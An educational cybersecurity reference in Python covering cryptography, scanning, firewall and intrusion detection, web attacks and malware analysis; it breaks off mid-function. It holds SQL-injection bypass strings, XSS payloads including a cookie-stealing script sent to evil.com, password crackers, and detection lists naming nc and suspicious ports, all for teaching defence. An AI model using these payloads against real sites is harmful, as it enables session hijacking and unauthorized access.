Cybersecurity & Penetration Testing Complete Reference
CHAPTER 1: GETTING STARTED WITH CYBERSECURITY
Remarks
Cybersecurity protects systems, networks, and data from digital attacks. Key domains: offensive security (penetration testing, red teaming), defensive security (SOC, incident response), cryptography, network security, application security, forensics, malware analysis. The field follows ethical guidelines: always get explicit authorization before testing systems.
Tools: Python (scripting), Kali Linux (distro), Nmap (scanning), Wireshark (packet analysis), Metasploit (exploitation), Burp Suite (web testing), John the Ripper (password cracking), Hashcat (GPU cracking), Aircrack-ng (wireless), Ghidra (reverse engineering).
Ethical Disclaimer
# ⚠️  IMPORTANT: All code in this reference is for EDUCATIONAL PURPOSES ONLY.
# ⚠️  Never use these techniques on systems you don't own or have explicit permission to test.
# ⚠️  Unauthorized access to computer systems is illegal in most jurisdictions.
# ⚠️  Practice only on: your own systems, intentionally vulnerable VMs (DVWA, Metasploitable, HackTheBox).

Hello Security
# hello_security.py
"""
First security program: hash a password and verify it.
"""
import hashlib
import secrets
import hmac

def hash_password(password: str, salt: str = None) -> tuple[str, str]:
    """Hash password with salt using PBKDF2."""
    if salt is None:
        salt = secrets.token_hex(16)
    
    # PBKDF2 with 600,000 iterations (OWASP recommendation)
    pwd_hash = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        iterations=600000
    )
    return pwd_hash.hex(), salt

def verify_password(password: str, stored_hash: str, salt: str) -> bool:
    """Verify password against stored hash."""
    computed_hash, _ = hash_password(password, salt)
    return hmac.compare_digest(computed_hash, stored_hash)

# Example
password = "MySecureP@ssw0rd!"
pwd_hash, salt = hash_password(password)

print(f"Password: {password}")
print(f"Salt: {salt}")
print(f"Hash: {pwd_hash}")
print(f"Verification (correct): {verify_password(password, pwd_hash, salt)}")
print(f"Verification (wrong):   {verify_password('wrong', pwd_hash, salt)}")

# Demonstrate why salt matters
passwords = ["password", "password", "password"]
print("\nWithout salt (same hash for same password):")
for p in passwords:
    h = hashlib.sha256(p.encode()).hexdigest()[:16]
    print(f"  '{p}' → {h}")

print("\nWith salt (different hash each time):")
for p in passwords:
    h, s = hash_password(p)
    print(f"  '{p}' (salt={s[:8]}...) → {h[:16]}...")

Security Mindset
# CIA Triad:
# - Confidentiality: only authorized access
# - Integrity: data not tampered with
# - Availability: systems accessible when needed

# Defense in Depth:
# - Multiple layers of security
# - If one fails, others still protect

# Common attack vectors:
# - Phishing (social engineering)
# - Malware (ransomware, trojans, worms)
# - Network attacks (MITM, DDoS)
# - Web attacks (SQLi, XSS, CSRF)
# - Credential attacks (brute force, credential stuffing)
# - Insider threats

# Security frameworks:
# - NIST Cybersecurity Framework
# - ISO 27001
# - OWASP Top 10 (web vulnerabilities)
# - MITRE ATT&CK (adversary tactics)

CHAPTER 2: APPLIED CRYPTOGRAPHY
Password Cracking (Educational)
# Demonstrates why weak passwords are vulnerable.
# Real crackers: John the Ripper, Hashcat

import hashlib
import itertools
import string
import time

def brute_force_md5(target_hash: str, max_length: int = 4) -> str:
    """Brute force MD5 hash (educational - very slow)."""
    charset = string.ascii_lowercase + string.digits
    
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            if hashlib.md5(candidate.encode()).hexdigest() == target_hash:
                return candidate
    return None

def dictionary_attack(target_hash: str, wordlist: list) -> str:
    """Try common passwords from wordlist."""
    for word in wordlist:
        if hashlib.md5(word.strip().encode()).hexdigest() == target_hash:
            return word.strip()
    return None

# Example: crack a weak MD5 hash
weak_password = "abc123"
target = hashlib.md5(weak_password.encode()).hexdigest()
print(f"Target MD5: {target}")

# Dictionary attack
common_passwords = ["password", "123456", "abc123", "letmein", "admin", "qwerty"]
start = time.time()
cracked = dictionary_attack(target, common_passwords)
print(f"Dictionary attack: '{cracked}' in {time.time()-start:.4f}s")

# Brute force (only for short passwords!)
start = time.time()
cracked = brute_force_md5(target, max_length=6)
print(f"Brute force: '{cracked}' in {time.time()-start:.4f}s")

# Why MD5 is broken:
# 1. Fast to compute (billions/sec on GPU)
# 2. Collision attacks exist
# 3. Rainbow tables pre-computed
print("\n⚠️  Never use MD5 for password storage!")

Encryption: AES-GCM
# AES-GCM: Authenticated encryption (confidentiality + integrity)
# Standard for modern encryption (TLS 1.3, disk encryption)

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import os

def derive_key(password: str, salt: bytes) -> bytes:
    """Derive 256-bit key from password."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=600000,
    )
    return kdf.derive(password.encode())

def encrypt_message(plaintext: str, password: str) -> bytes:
    """Encrypt message with AES-GCM."""
    salt = os.urandom(16)
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # 96-bit nonce
    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
    # Return: salt + nonce + ciphertext
    return salt + nonce + ciphertext

def decrypt_message(encrypted: bytes, password: str) -> str:
    """Decrypt AES-GCM message."""
    salt = encrypted[:16]
    nonce = encrypted[16:28]
    ciphertext = encrypted[28:]
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
    return plaintext.decode()

# Example
message = "This is a secret message!"
password = "StrongP@ssw0rd!"

encrypted = encrypt_message(message, password)
print(f"\nEncrypted ({len(encrypted)} bytes): {encrypted.hex()[:64]}...")

decrypted = decrypt_message(encrypted, password)
print(f"Decrypted: {decrypted}")

# Tampering detection (GCM provides authentication)
tampered = bytearray(encrypted)
tampered[-1] ^= 0xFF  # Flip last bit
try:
    decrypt_message(bytes(tampered), password)
    print("ERROR: Tampering not detected!")
except Exception as e:
    print(f"✓ Tampering detected: {type(e).__name__}")

Digital Signatures (RSA)
# RSA signatures: prove message authenticity and integrity

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

def generate_rsa_keypair():
    """Generate RSA-2048 key pair."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    public_key = private_key.public_key()
    return private_key, public_key

def sign_message(private_key, message: str) -> bytes:
    """Sign message with RSA-PSS."""
    return private_key.sign(
        message.encode(),
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

def verify_signature(public_key, message: str, signature: bytes) -> bool:
    """Verify RSA signature."""
    try:
        public_key.verify(
            signature,
            message.encode(),
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False

# Example
private_key, public_key = generate_rsa_keypair()
message = "I authorize this transaction"

signature = sign_message(private_key, message)
print(f"\nSignature: {signature.hex()[:64]}...")

print(f"Valid signature:   {verify_signature(public_key, message, signature)}")
print(f"Tampered message:  {verify_signature(public_key, message + "!", signature)}")

CHAPTER 3: NETWORK SECURITY
Port Scanner
# Port scanning: discover open ports on a target
# Educational implementation - use Nmap in practice

import socket
import concurrent.futures
from datetime import datetime

def scan_port(host: str, port: int, timeout: float = 1.0) -> dict:
    """Scan a single TCP port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            # Try to identify service
            try:
                service = socket.getservbyport(port)
            except OSError:
                service = "unknown"
            return {'port': port, 'state': 'open', 'service': service}
    except Exception:
        pass
    return {'port': port, 'state': 'closed', 'service': None}

def port_scan(host: str, ports: list, threads: int = 100) -> list:
    """Multi-threaded port scan."""
    print(f"\nStarting scan of {host} at {datetime.now()}")
    print(f"Scanning {len(ports)} ports with {threads} threads...\n")
    
    open_ports = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result['state'] == 'open':
                open_ports.append(result)
                print(f"  Port {result['port']:5d}/tcp  OPEN  ({result['service']})")
    
    open_ports.sort(key=lambda x: x['port'])
    return open_ports

# Example: scan common ports on localhost
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                993, 995, 1433, 1521, 3306, 3389, 5432, 8080, 8443]

# results = port_scan("127.0.0.1", common_ports)
# print(f"\nScan complete: {len(results)} open ports found")

Packet Sniffing (Scapy)
# Packet sniffing: capture network traffic
# Requires root/admin privileges

try:
    from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Scapy not installed. Install with: pip install scapy")

def packet_callback(packet):
    """Process each captured packet."""
    if IP in packet:
        src = packet[IP].src
        dst = packet[IP].dst
        proto = packet[IP].proto
        
        info = f"{src} → {dst} "
        
        if TCP in packet:
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            info += f"TCP {sport}→{dport} [{flags}] "
            
            # Detect HTTP requests
            if Raw in packet and dport == 80:
                try:
                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
                    if payload.startswith(('GET', 'POST', 'PUT', 'DELETE')):
                        first_line = payload.split('\r\n')[0]
                        info += f"\n    HTTP: {first_line}"
                except Exception:
                    pass
        
        elif UDP in packet:
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            info += f"UDP {sport}→{dport} "
            
            # DNS queries
            if DNS in packet and dport == 53:
                try:
                    qname = packet[DNS].qd.qname.decode()
                    info += f"\n    DNS: {qname}"
                except Exception:
                    pass
        
        elif proto == 1:  # ICMP
            info += "ICMP "
        
        print(info)

if SCAPY_AVAILABLE:
    # Capture 10 packets (requires root)
    # print("\n=== Packet Capture (10 packets) ===")
    # sniff(prn=packet_callback, count=10, store=False)
    pass

SYN Flood Detection (Educational)
# SYN flood: DoS attack using half-open TCP connections
# Detection: high rate of SYN packets without ACKs

class SYNfloodDetector:
    """Detect potential SYN flood attacks."""
    
    def __init__(self, threshold=100, window=10):
        self.threshold = threshold  # SYN packets per window
        self.window = window        # seconds
        self.syn_counts = {}        # src_ip → count
        self.ack_counts = {}        # src_ip → count
    
    def process_packet(self, src_ip, is_syn, is_ack):
        """Process a packet and check for flood."""
        if is_syn and not is_ack:
            self.syn_counts[src_ip] = self.syn_counts.get(src_ip, 0) + 1
        elif is_ack:
            self.ack_counts[src_ip] = self.ack_counts.get(src_ip, 0) + 1
    
    def check_flood(self, src_ip):
        """Check if source is flooding."""
        syn_count = self.syn_counts.get(src_ip, 0)
        ack_count = self.ack_counts.get(src_ip, 0)
        
        # High SYN rate with low ACK rate = potential flood
        if syn_count > self.threshold and ack_count < syn_count * 0.1:
            return True, syn_count, ack_count
        return False, syn_count, ack_count

# Example
detector = SYNfloodDetector(threshold=50)

# Simulate normal traffic
for _ in range(10):
    detector.process_packet("192.168.1.100", True, False)
    detector.process_packet("192.168.1.100", False, True)

# Simulate attack
for _ in range(100):
    detector.process_packet("10.0.0.666", True, False)

flood, syn, ack = detector.check_flood("10.0.0.666")
print(f"\nSYN Flood Detection:")
print(f"  Normal client: SYN={detector.syn_counts.get('192.168.1.100', 0)}, "
      f"ACK={detector.ack_counts.get('192.168.1.100', 0)}")
print(f"  Attacker: SYN={syn}, ACK={ack} → {'🚨 FLOOD DETECTED' if flood else 'OK'}")

Firewall Rules (iptables simulation)
# Firewall: filter traffic based on rules

class SimpleFirewall:
    """Educational firewall simulator."""
    
    def __init__(self):
        self.rules = []
        self.default_policy = 'DROP'
        self.log = []
    
    def add_rule(self, action, protocol=None, src=None, dst=None, 
                 sport=None, dport=None, state=None):
        """Add a firewall rule."""
        rule = {
            'action': action,  # 'ACCEPT' or 'DROP'
            'protocol': protocol,
            'src': src,
            'dst': dst,
            'sport': sport,
            'dport': dport,
            'state': state
        }
        self.rules.append(rule)
    
    def check_packet(self, protocol, src, dst, sport, dport, state='NEW'):
        """Check packet against rules."""
        self.log.append({
            'proto': protocol, 'src': src, 'dst': dst,
            'sport': sport, 'dport': dport, 'state': state
        })
        
        for rule in self.rules:
            if self._matches(rule, protocol, src, dst, sport, dport, state):
                return rule['action']
        
        return self.default_policy
    
    def _matches(self, rule, protocol, src, dst, sport, dport, state):
        """Check if packet matches rule."""
        if rule['protocol'] and rule['protocol'] != protocol:
            return False
        if rule['src'] and rule['src'] != src:
            return False
        if rule['dst'] and rule['dst'] != dst:
            return False
        if rule['sport'] and rule['sport'] != sport:
            return False
        if rule['dport'] and rule['dport'] != dport:
            return False
        if rule['state'] and rule['state'] != state:
            return False
        return True
    
    def show_log(self, last_n=10):
        """Show recent firewall log."""
        for entry in self.log[-last_n:]:
            action = self.check_packet(**entry)
            print(f"  [{action}] {entry['proto']} {entry['src']}:{entry['sport']} "
                  f"→ {entry['dst']}:{entry['dport']} ({entry['state']})")

# Example: typical firewall rules
fw = SimpleFirewall()

# Allow established connections
fw.add_rule('ACCEPT', state='ESTABLISHED')

# Allow SSH from internal network
fw.add_rule('ACCEPT', protocol='TCP', dport=22, src='192.168.1.0/24')

# Allow HTTP/HTTPS from anywhere
fw.add_rule('ACCEPT', protocol='TCP', dport=80)
fw.add_rule('ACCEPT', protocol='TCP', dport=443)

# Block specific IP
fw.add_rule('DROP', src='10.0.0.666')

# Test packets
print("\n=== Firewall Test ===")
print(f"SSH from internal: {fw.check_packet('TCP', '192.168.1.50', '10.0.0.1', 54321, 22)}")
print(f"SSH from external: {fw.check_packet('TCP', '8.8.8.8', '10.0.0.1', 54321, 22)}")
print(f"HTTP from anywhere: {fw.check_packet('TCP', '8.8.8.8', '10.0.0.1', 54321, 80)}")
print(f"Blocked IP: {fw.check_packet('TCP', '10.0.0.666', '10.0.0.1', 54321, 80)}")

CHAPTER 4: WEB SECURITY
SQL Injection (Educational)
# SQL injection: exploit vulnerable database queries
# OWASP Top 10: #1 - Injection

def vulnerable_login(username, password):
    """VULNERABLE: string concatenation in SQL."""
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    return query

def safe_login(username, password):
    """SAFE: parameterized query."""
    # In real code: cursor.execute("SELECT * FROM users WHERE username=? AND password=?", 
    #                              (username, password))
    return f"SELECT * FROM users WHERE username=? AND password=? (params: {username}, {password})"

# Demonstrate injection
print("=== SQL Injection Demo ===")
print("\nVulnerable implementation:")
print(vulnerable_login("admin", "password"))

# Attack: bypass authentication
malicious_user = "admin' --"
malicious_pass = "anything"
print(f"\nAttack: username='{malicious_user}'")
print(f"Resulting query: {vulnerable_login(malicious_user, malicious_pass)}")
print("→ Comment (--) ignores password check!")

# Another attack: UNION-based data extraction
union_attack = "' UNION SELECT username, password FROM users --"
print(f"\nUNION attack: {vulnerable_login(union_attack, 'x')}")

print("\n\nSafe implementation:")
print(safe_login(malicious_user, malicious_pass))
print("→ Parameters are escaped, injection fails")

Cross-Site Scripting (XSS)
# XSS: inject malicious JavaScript into web pages

def vulnerable_render(user_input):
    """VULNERABLE: direct HTML rendering."""
    return f"<div>{user_input}</div>"

def safe_render(user_input):
    """SAFE: HTML escaping."""
    import html
    return f"<div>{html.escape(user_input)}</div>"

# XSS attack examples
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>'
]

print("\n=== XSS Demo ===")
for payload in xss_payloads:
    print(f"\nPayload: {payload}")
    print(f"  Vulnerable: {vulnerable_render(payload)}")
    print(f"  Safe:       {safe_render(payload)}")

CSRF Protection
# CSRF: trick user into performing unwanted actions

import secrets

class CSRFProtection:
    """CSRF token generation and validation."""
    
    def __init__(self):
        self.tokens = {}  # session_id → token
    
    def generate_token(self, session_id):
        """Generate CSRF token for session."""
        token = secrets.token_urlsafe(32)
        self.tokens[session_id] = token
        return token
    
    def validate_token(self, session_id, submitted_token):
        """Validate CSRF token."""
        expected = self.tokens.get(session_id)
        if expected is None:
            return False
        # Constant-time comparison
        return secrets.compare_digest(expected, submitted_token)
    
    def invalidate(self, session_id):
        """Remove token after use."""
        self.tokens.pop(session_id, None)

# Example
csrf = CSRFProtection()
session = "user_session_123"

# Server generates token
token = csrf.generate_token(session)
print(f"\n=== CSRF Protection ===")
print(f"Generated token: {token[:32]}...")

# Form includes hidden field
form_html = f'<form method="POST"><input type="hidden" name="csrf_token" value="{token}">'

# Attacker tries without token
print(f"Request without token: {csrf.validate_token(session, '')}")

# Legitimate request with token
print(f"Request with valid token: {csrf.validate_token(session, token)}")

# Attacker with forged token
print(f"Request with forged token: {csrf.validate_token(session, 'forged_token')}")

Security Headers
# HTTP security headers protect against various attacks

def generate_security_headers():
    """Generate recommended security headers."""
    return {
        # Prevent MIME type sniffing
        'X-Content-Type-Options': 'nosniff',
        
        # Clickjacking protection
        'X-Frame-Options': 'DENY',
        
        # XSS filter (legacy browsers)
        'X-XSS-Protection': '1; mode=block',
        
        # HTTPS enforcement
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        
        # Content Security Policy
        'Content-Security-Policy': "default-src 'self'; script-src 'self'",
        
        # Referrer policy
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        
        # Permissions policy
        'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    }

headers = generate_security_headers()
print("\n=== Security Headers ===")
for header, value in headers.items():
    print(f"  {header}: {value}")

CHAPTER 5: SYSTEM ATTACKS
Keylogger (Educational - Linux)
# Demonstrates keylogging concept
# Real keyloggers are illegal without consent

class SimpleKeylogger:
    """Educational keylogger simulation (no actual input capture)."""
    
    def __init__(self):
        self.log = []
        self.active = False
    
    def start(self):
        """Start logging (simulation)."""
        self.active = True
        print("🔴 Keylogger started (simulation)")
    
    def stop(self):
        """Stop logging."""
        self.active = False
        print("⚫ Keylogger stopped")
    
    def simulate_keystroke(self, key):
        """Simulate capturing a keystroke."""
        if self.active:
            self.log.append(key)
    
    def get_log(self):
        """Return captured log."""
        return ''.join(self.log)

# Simulation
kl = SimpleKeylogger()
kl.start()

# Simulate user typing
for char in "password123":
    kl.simulate_keystroke(char)

kl.stop()
print(f"Captured: {kl.get_log()}")
print("\n⚠️  Defenses: antivirus, input method editors, virtual keyboards")

Privilege Escalation Concepts
# Common privilege escalation vectors:
# 1. SUID/SGID binaries (Linux)
# 2. Misconfigured sudo
# 3. Kernel exploits
# 4. Writable system files
# 5. Service misconfigurations

def check_suid_binaries():
    """Check for SUID binaries (Linux command simulation)."""
    # Real command: find / -perm -4000 -type f 2>/dev/null
    common_suid = [
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/bin/su',
        '/usr/bin/ping',
        '/usr/bin/mount',
    ]
    print("Common SUID binaries (legitimate):")
    for binary in common_suid:
        print(f"  {binary}")
    
    print("\n⚠️  Suspicious SUID binaries to investigate:")
    suspicious = ['/tmp/exploit', '/home/user/script.sh']
    for binary in suspicious:
        print(f"  🚨 {binary}")

def check_sudo_misconfig():
    """Check sudo misconfigurations."""
    # Dangerous: ALL=(ALL) NOPASSWD: ALL
    dangerous_configs = [
        'user ALL=(ALL) NOPASSWD: ALL',  # No password required
        'user ALL=(ALL) ALL',            # Can run anything
        '%wheel ALL=(root) /bin/bash',   # Shell as root
    ]
    print("\n⚠️  Dangerous sudo configurations:")
    for config in dangerous_configs:
        print(f"  {config}")

check_suid_binaries()
check_sudo_misconfig()

Reverse Shell Detection
# Reverse shell: attacker connects back to victim

class ReverseShellDetector:
    """Detect suspicious outbound connections."""
    
    SUSPICIOUS_PORTS = [4444, 5555, 8888, 1337, 31337]
    SUSPICIOUS_PROCESSES = ['nc', 'ncat', 'bash', 'python', 'perl', 'php']
    
    def __init__(self):
        self.alerts = []
    
    def check_connection(self, src_ip, dst_ip, dst_port, process):
        """Check if connection is suspicious."""
        alerts = []
        
        if dst_port in self.SUSPICIOUS_PORTS:
            alerts.append(f"Suspicious port: {dst_port}")
        
        if process in self.SUSPICIOUS_PROCESSES and dst_port > 1024:
            alerts.append(f"Suspicious process on high port: {process}:{dst_port}")
        
        # Outbound to unusual destinations
        if not dst_ip.startswith(('192.168.', '10.', '172.16.')):
            if process in self.SUSPICIOUS_PROCESSES:
                alerts.append(f"Outbound connection from {process} to {dst_ip}")
        
        if alerts:
            self.alerts.append({
                'src': src_ip, 'dst': dst_ip, 'port': dst_port,
                'process': process, 'alerts': alerts
            })
            return True
        return False
    
    def report(self):
        """Print all alerts."""
        print(f"\n🚨 {len(self.alerts)} suspicious connections detected:")
        for alert in self.alerts:
            print(f"  {alert['src']} → {alert['dst']}:{alert['port']} "
                  f"({alert['process']})")
            for a in alert['alerts']:
                print(f"    ⚠️  {a}")

# Example
detector = ReverseShellDetector()

# Normal traffic
detector.check_connection('192.168.1.10', '8.8.8.8', 443, 'firefox')
detector.check_connection('192.168.1.10', '1.1.1.1', 80, 'curl')

# Suspicious traffic
detector.check_connection('192.168.1.10', '45.33.32.156', 4444, 'bash')
detector.check_connection('192.168.1.10', '104.18.32.7', 1337, 'nc')
detector.check_connection('192.168.1.10', '185.220.101.1', 8888, 'python')

detector.report()

CHAPTER 6: WIRELESS SECURITY
WPA2 Handshake Capture (Conceptual)
# WPA2 attack: capture 4-way handshake, crack offline

class WPA2Attack:
    """Educational WPA2 attack simulation."""
    
    def __init__(self):
        self.handshake_captured = False
        self.essid = None
        self.ap_mac = None
        self.client_mac = None
    
    def simulate_capture(self, essid, ap_mac, client_mac):
        """Simulate capturing WPA2 handshake."""
        print(f"\n📡 Monitoring for {essid} ({ap_mac})...")
        print(f"  [1/4] Deauth sent to {client_mac}")
        print(f"  [2/4] Handshake message 1 captured")
        print(f"  [3/4] Handshake message 2 captured ✓")
        print(f"  [4/4] Handshake complete!")
        
        self.handshake_captured = True
        self.essid = essid
        self.ap_mac = ap_mac
        self.client_mac = client_mac
    
    def crack_handshake(self, wordlist):
        """Attempt to crack captured handshake."""
        if not self.handshake_captured:
            print("No handshake captured!")
            return None
        
        print(f"\n🔓 Cracking {self.essid} with {len(wordlist)} passwords...")
        
        # Simulate PBKDF2 computation (real: 4096 iterations of HMAC-SHA1)
        for i, password in enumerate(wordlist):
            if i % 1000 == 0:
                print(f"  Tried {i}/{len(wordlist)} passwords...")
            
            # Simulate: check if password matches
            # Real: derive PMK, compute PTK, verify MIC
            if password == "weakpassword123":
                print(f"\n✓ Password found: {password}")
                return password
        
        print("\n✗ Password not in wordlist")
        return None

# Example
attack = WPA2Attack()
attack.simulate_capture("HomeNetwork", "AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66")

wordlist = ["password", "123456", "admin", "weakpassword123", "letmein"]
cracked = attack.crack_handshake(wordlist)

WPA3 Improvements
# WPA3 fixes WPA2 vulnerabilities:
# 1. SAE (Simultaneous Authentication of Equals) - prevents offline attacks
# 2. Forward secrecy - past sessions secure if password compromised
# 3. Stronger crypto (192-bit minimum)

def compare_wpa2_wpa3():
    """Compare WPA2 and WPA3 security."""
    print("\n=== WPA2 vs WPA3 ===")
    print("\nWPA2 vulnerabilities:")
    print("  ✗ Offline dictionary attacks (KRACK, handshake capture)")
    print("  ✗ Weak passwords easily cracked")
    print("  ✗ No forward secrecy")
    print("  ✗ WPA2-Enterprise: shared PMK possible")
    
    print("\nWPA3 improvements:")
    print("  ✓ SAE prevents offline attacks")
    print("  ✓ Forward secrecy (each session unique)")
    print("  ✓ 192-bit minimum security suite")
    print("  ✓ Dragonfly key exchange")
    
    print("\nRecommendation: Use WPA3 where possible, WPA2-AES otherwise")

compare_wpa2_wpa3()

Evil Twin Attack Detection
# Evil twin: rogue AP mimicking legitimate network

class EvilTwinDetector:
    """Detect evil twin attacks."""
    
    def __init__(self):
        self.known_aps = {}  # ssid → [(bssid, channel, signal)]
    
    def register_legitimate(self, ssid, bssid, channel, signal):
        """Register legitimate AP."""
        if ssid not in self.known_aps:
            self.known_aps[ssid] = []
        self.known_aps[ssid].append({
            'bssid': bssid, 'channel': channel, 'signal': signal
        })
    
    def check_suspicious(self, ssid, bssid, channel, signal):
        """Check if AP is suspicious."""
        if ssid not in self.known_aps:
            return "New network (not necessarily evil)"
        
        known = self.known_aps[ssid]
        
        # Same SSID, different BSSID = suspicious
        if not any(ap['bssid'] == bssid for ap in known):
            return "🚨 EVIL TWIN: Same SSID, different BSSID!"
        
        # Same SSID, different channel = suspicious
        if not any(ap['channel'] == channel for ap in known):
            return "⚠️  Suspicious: Same SSID, different channel"
        
        # Much stronger signal = suspicious
        known_signal = next(ap['signal'] for ap in known if ap['bssid'] == bssid)
        if signal > known_signal + 20:
            return "⚠️  Suspicious: Much stronger signal"
        
        return "✓ Legitimate"

# Example
detector = EvilTwinDetector()
detector.register_legitimate("OfficeWiFi", "AA:BB:CC:DD:EE:01", 6, -65)

print("\n=== Evil Twin Detection ===")
print(detector.check_suspicious("OfficeWiFi", "AA:BB:CC:DD:EE:01", 6, -65))
print(detector.check_suspicious("OfficeWiFi", "AA:BB:CC:DD:EE:99", 6, -60))
print(detector.check_suspicious("OfficeWiFi", "AA:BB:CC:DD:EE:01", 11, -65))
print(detector.check_suspicious("OfficeWiFi", "AA:BB:CC:DD:EE:01", 6, -40))

CHAPTER 7: MALWARE ANALYSIS
Static Analysis
# Static analysis: examine malware without executing it

class StaticAnalyzer:
    """Basic static analysis of PE files (educational)."""
    
    SUSPICIOUS_STRINGS = [
        'cmd.exe', 'powershell', 'regedit', 'taskkill',
        'whoami', 'net user', 'mimikatz', 'keylog',
        'encrypt', 'ransom', 'bitcoin', 'tor', '.onion'
    ]
    
    SUSPICIOUS_IMPORTS = [
        'VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread',
        'LoadLibrary', 'GetProcAddress', 'InternetOpen',
        'URLDownloadToFile', 'CryptEncrypt'
    ]
    
    def __init__(self):
        self.findings = []
    
    def analyze_strings(self, content):
        """Search for suspicious strings."""
        print("\n=== String Analysis ===")
        for suspicious in self.SUSPICIOUS_STRINGS:
            if suspicious.lower() in content.lower():
                self.findings.append(f"String: '{suspicious}'")
                print(f"  🚨 Found: {suspicious}")
    
    def analyze_imports(self, imports):
        """Check for suspicious API imports."""
        print("\n=== Import Analysis ===")
        for imp in imports:
            if imp in self.SUSPICIOUS_IMPORTS:
                self.findings.append(f"Import: {imp}")
                print(f"  🚨 Suspicious import: {imp}")
    
    def analyze_entropy(self, data):
        """Calculate entropy (high entropy = packed/encrypted)."""
        import math
        from collections import Counter
        
        counts = Counter(data)
        length = len(data)
        entropy = 0
        
        for count in counts.values():
            p = count / length
            entropy -= p * math.log2(p)
        
        print(f"\n=== Entropy Analysis ===")
        print(f"  Entropy: {entropy:.2f} bits/byte")
        
        if entropy > 7.5:
            self.findings.append(f"High entropy: {entropy:.2f}")
            print("  🚨 High entropy → likely packed/encrypted")
        elif entropy > 6.5:
            print("  ⚠️  Moderate entropy")
        else:
            print("  ✓ Normal entropy")
    
    def report(self):
        """Generate analysis report."""
        print(f"\n=== Analysis Report ===")
        print(f"Total findings: {len(self.findings)}")
        
        if len(self.findings) > 5:
            print("🚨 VERDICT: Highly suspicious - likely malware")
        elif len(self.findings) > 2:
            print("⚠️  VERDICT: Suspicious - requires further analysis")
        else:
            print("✓ VERDICT: Likely benign")

# Example simulation
analyzer = StaticAnalyzer()

# Simulated PE file content
fake_content = """
This program uses cmd.exe to execute commands.
It connects to .onion addresses via Tor.
Uses VirtualAlloc and WriteProcessMemory.
"""

fake_imports = ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 
                'LoadLibrary', 'MessageBox']

fake_data = "A" * 1000 + "B" * 100  # Low entropy example

analyzer.analyze_strings(fake_content)
analyzer.analyze_imports(fake_imports)
analyzer.analyze_entropy(fake_data)
analyzer.report()

YARA Rules
# YARA: pattern matching for malware identification

class YARARule:
    """Simplified YARA rule engine."""
    
    def __init__(self, name, strings, condition):
        self.name = name
        self.strings = strings  # dict: name → (type, value)
        self.condition = condition
    
    def match(self, content):
        """Check if content matches rule."""
        matches = {}
        
        for name, (stype, value) in self.strings.items():
            if stype == 'text':
                if value.lower() in content.lower():
                    matches[name] = value
            elif stype == 'hex':
                # Simplified hex matching
                pass
            elif stype == 'regex':
                import re
                if re.search(value, content, re.IGNORECASE):
                    matches[name] = value
        
        # Evaluate condition (simplified)
        if self.condition == 'any of them':
            return len(matches) > 0
        elif self.condition == 'all of them':
            return len(matches) == len(self.strings)
        elif 'and' in self.condition:
            # Parse "name1 and name2"
            parts = [p.strip() for p in self.condition.split('and')]
            return all(p in matches for p in parts)
        
        return False

# Example YARA rules
rules = [
    YARARule(
        name="Ransomware_Indicator",
        strings={
            'ext1': ('text', '.encrypted'),
            'ext2': ('text', '.locked'),
            'msg': ('text', 'your files have been encrypted'),
        },
        condition='any of them'
    ),
    YARARule(
        name="Keylogger_Behavior",
        strings={
            'hook': ('text', 'SetWindowsHookEx'),
            'keylog': ('text', 'keylog'),
        },
        condition='hook and keylog'
    ),
]

# Test samples
samples = {
    'benign.txt': 'This is a normal document with regular text.',
    'ransomware_note.txt': 'Your files have been encrypted! Pay bitcoin to .encrypted address.',
    'keylogger.exe': 'Program uses SetWindowsHookEx for keylog functionality.',
}

print("\n=== YARA Rule Matching ===")
for filename, content in samples.items():
    print(f"\n{filename}:")
    matched = False
    for rule in rules:
        if rule.match(content):
            print(f"  🚨 MATCH: {rule.name}")
            matched = True
    if not matched:
        print(f"  ✓ No matches")

Sandbox Detection Evasion
# Malware often checks for sandbox environments

class SandboxEvasion:
    """Detect common sandbox evasion techniques."""
    
    def __init__(self):
        self.indicators = []
    
    def check_vm_artifacts(self):
